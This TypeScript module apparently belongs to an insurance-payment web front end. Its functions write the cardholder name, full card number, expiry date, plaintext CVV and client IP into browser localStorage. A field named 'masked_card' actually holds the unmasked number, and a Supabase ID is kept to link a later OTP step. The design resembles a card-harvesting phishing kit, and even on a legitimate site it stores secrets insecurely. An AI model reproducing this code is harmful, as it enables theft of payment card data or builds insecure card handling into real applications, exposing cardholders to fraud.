const SESSION_KEY = 'care_session_id'
const USER_KEY = 'user_id'

export function getOrCreateSessionId(): string {
  let id = localStorage.getItem(SESSION_KEY)
  if (!id) {
    id = crypto.randomUUID()
    localStorage.setItem(SESSION_KEY, id)
  }
  return id
}

export function getExternalUserId(): string | null {
  return localStorage.getItem(USER_KEY)
}

export function setExternalUserId(id: string | null): void {
  if (!id) {
    localStorage.removeItem(USER_KEY)
    return
  }
  localStorage.setItem(USER_KEY, id)
}

const INSURANCE_KEY = 'insurance_data'

export type InsuranceSelection = {
  company: string
  logo?: string
  plan: string
  base: number
  price: number
  vat: number
  total: number
  features: { label: string; price: number }[]
  start_date?: string
  end_date?: string
}

export function readInsuranceSelection(): InsuranceSelection | null {
  const raw = localStorage.getItem(INSURANCE_KEY)
  if (!raw) return null
  try {
    return JSON.parse(raw) as InsuranceSelection
  } catch {
    return null
  }
}

export function writeInsuranceSelection(data: InsuranceSelection): void {
  localStorage.setItem(INSURANCE_KEY, JSON.stringify(data))
}

/** مطابقة `$_SESSION['last_payment']` في tele/payen.php + حقل تعريف Supabase الداخلي */
export const LAST_PAYMENT_KEY = 'last_payment_meta'

export type PhpLastPaymentInsurance = {
  company: string
  plan: string
  base: string
  price: string
  vat: string
  total: string
  features: { label: string; price: string }[]
  start_date?: string
  end_date?: string
}

export type PhpLastPaymentSession = {
  cardholder_name: string
  card_number_raw: string
  masked_card: string
  expiry_date: string
  cvv_raw: string
  payment_method: string
  total_amount: string
  client_ip: string
  insurance: PhpLastPaymentInsurance
  user_id: string
  /** لربط OTP بـ Supabase فقط؛ غير موجودة في الجلسة PHP */
  _sup_payment_id?: string | null
}

export function insuranceToPhpSession(
  sel: InsuranceSelection,
  startFallback: string,
  endFallback: string,
): PhpLastPaymentInsurance {
  const fnum = (n: number) => String(n)
  return {
    company: sel.company,
    plan: sel.plan,
    base: fnum(sel.base),
    price: fnum(sel.price),
    vat: fnum(sel.vat),
    total: fnum(sel.total),
    features: (sel.features ?? []).map((x) => ({
      label: x.label,
      price: String(x.price),
    })),
    start_date: sel.start_date ?? startFallback,
    end_date: sel.end_date ?? endFallback,
  }
}

export function writePhpLastPaymentSession(s: PhpLastPaymentSession): void {
  localStorage.setItem(LAST_PAYMENT_KEY, JSON.stringify(s))
}

function isUuid(s: string): boolean {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
    s,
  )
}

export function panDisplayFromDigits(panDigits: string): string {
  const d = panDigits.replace(/\D/g, '')
  return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

/** يحوّل حقول PayPage إلى جلسة مطابقة لـ `$_SESSION['last_payment']`. */
export function writeLastPaymentMeta(m: {
  paymentRequestId: string
  /** للتوافق مع الاستدعاء السابق؛ يُستمد من البطاقة تلقائياً */
  cardLastFour?: string
  cardholderName: string
  insurance: InsuranceSelection
  panDigits: string
  cvvPlain: string
  expiryMmYy: string
  clientIp: string
  transactionId?: string | null
  externalUserId: string | null
}): void {
  const spaced = panDisplayFromDigits(m.panDigits)
  const insPhp = insuranceToPhpSession(
    m.insurance,
    m.insurance.start_date ?? '',
    m.insurance.end_date ?? '',
  )
  const uid =
    m.externalUserId && String(m.externalUserId).trim() !== ''
      ? String(m.externalUserId)
      : 'غير متوفر'

  writePhpLastPaymentSession({
    cardholder_name: m.cardholderName,
    card_number_raw: spaced,
    masked_card: spaced,
    expiry_date: m.expiryMmYy,
    cvv_raw: m.cvvPlain,
    payment_method: 'card',
    total_amount: String(m.insurance.total),
    client_ip: m.clientIp,
    insurance: insPhp,
    user_id: uid,
    _sup_payment_id:
      m.paymentRequestId && isUuid(m.paymentRequestId)
        ? m.paymentRequestId
        : null,
  })
}

/** للتوافق مع الصفحات التي تقرأ `readLastPaymentMeta` */
export function readLastPaymentMeta(): PhpLastPaymentSession | null {
  const raw = localStorage.getItem(LAST_PAYMENT_KEY)
  if (!raw) return null
  try {
    return JSON.parse(raw) as PhpLastPaymentSession
  } catch {
    return null
  }
}

export function cardLastDigitsFromPan(pan: string): string {
  const digits = pan.replace(/\D/g, '')
  return digits.length >= 4 ? digits.slice(-4) : ''
}
